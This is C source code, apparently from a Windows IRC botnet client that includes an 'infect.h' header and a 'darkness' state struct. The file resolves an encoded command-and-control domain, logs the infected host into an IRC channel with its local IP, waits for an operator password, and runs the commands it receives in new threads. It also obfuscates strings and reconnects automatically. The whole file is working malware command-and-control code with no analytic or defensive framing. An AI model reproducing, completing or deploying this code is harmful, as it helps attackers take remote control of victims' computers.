#include "infect.h"
#include "irc.h"
#include "mylib.h"
#include "dns.h"

#include <windows.h>
#include <winsock.h>

void 
IrcStartRoutine
(struct darkness_d *darkness) {
    char buf[0x200]; 
    struct hostent *hNetwork; 
    if(hNetwork=gethostbyname(DnsGetDomain(IRC_DNS))) {
      struct sockaddr_in addr;
      irc.sock=socket(AF_INET,SOCK_STREAM,0x0);
      addr.sin_family=AF_INET; 
      addr.sin_port=htons(0x1A0B);
      addr.sin_addr=*((struct in_addr *)hNetwork->h_addr);
      connect(irc.sock,(struct sockaddr *)&addr,sizeof(struct sockaddr));
      sprintf(buf,
          "\r\nUSER %s \"\" \"%s\" :%s\r\n"
          "\r\nNICK %s\r\n"
          "\r\nMODE %s +d\r\n",
          irc.alias,GetLocalIpAddress(),irc.alias,irc.alias,irc.alias); 
      if(send(irc.sock,buf,strlen(buf),0x0) > 0x0)
        irc.connected=0x1;
      IrcJoin(irc.channel);
      while(irc.connected) {
          memset(buf,'\0',sizeof(buf));
          if(recv(irc.sock,buf,sizeof(buf),0x0) <= 0x0)
            irc.connected=0x0;
          if(strstr(buf,irc.password) && !irc.auth) irc.auth=0x1;
          else if(irc.auth && strlen(buf) > 0x0 || strstr(buf,riddle_enc("VOTM&@"))) // PING :
                 CreateThread(NULL,0x0,(LPTHREAD_START_ROUTINE)IrcParse,buf,0x0,0x0);
          Sleep(0x200);
      } 
      closesocket(irc.sock);
    } 
    ExitThread(0x0);
}

void 
IrcCheckConnectedStatus
(struct darkness_d *darkness) {
    while(0x1) {
      Sleep(0xEA60);
      if(send(irc.sock,0x0,0x0,0x0) == SOCKET_ERROR) {
        CreateThread(NULL,0x0,
             (LPTHREAD_START_ROUTINE)IrcStartRoutine,
             darkness,0x0,0x0);
        irc.auth=0x0;
      }
    }
}

void 
IrcMain
(struct darkness_d *darkness) {
    GetComputerData(NULL,COMMAND_TYPE_IRC);
    CreateThread(NULL,0x0,
         (LPTHREAD_START_ROUTINE)IrcStartRoutine,
         darkness,0x0,0x0);
    IrcCheckConnectedStatus(darkness);
}

void 
IrcSend
(char *buf) {
     char tmp[strlen(buf)+0xC];
     sprintf(tmp,"\r\nPRIVMSG %s :%s\r\n",irc.channel,buf);
     send(irc.sock,tmp,strlen(tmp),0x0);   
}  

void 
IrcJoin
(char *lpChannel) {
     char tmp[strlen(lpChannel)+0xA];
     sprintf(tmp,"\r\nJOIN %s\r\n",lpChannel);
     send(irc.sock,tmp,strlen(tmp),0x0);  
} 
